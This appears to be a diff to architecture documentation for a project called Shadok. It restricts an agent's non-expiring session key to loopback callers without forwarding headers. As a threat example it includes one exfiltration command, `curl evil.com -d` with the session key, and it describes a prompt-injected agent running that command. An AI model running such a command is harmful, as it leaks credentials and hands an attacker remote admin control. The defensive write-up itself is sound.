@@ -1000,6 +1000,15 @@ Auth section of `docs/architecture.md`).
     have rebuilt this very cliff one restart wide instead of a week. The channel
     list is on disk, survives the restart, and loses its entry when the agent is
     closed, which is exactly when the key should stop working.
+    **And only from THIS machine.** A key that never expires and is worth the
+    bootstrap admin turned one exfiltrated variable (a prompt-injected agent
+    running `curl evil.com -d "$SHADOK_SESSION_KEY"`) into permanent remote
+    admin on any network-reachable instance, two-factor or not. Every route reads
+    the key through `localSessionForKey`, which requires `isLocalCaller`
+    (`src/net.ts`): a loopback socket AND no forwarding header — a same-host
+    reverse proxy also connects from 127.0.0.1, and its `X-Forwarded-For` is the
+    only thing that says "relayed" (README, "Behind TLS"). Never call
+    `sessionForKey` alone from a route.
     One consequence to state plainly: an agent that predates this fix holds a
     random UUID no derivation can recognise, and an expired cookie. Nothing
     unforgeable survives in its env, so it needs **one** reload — and then never
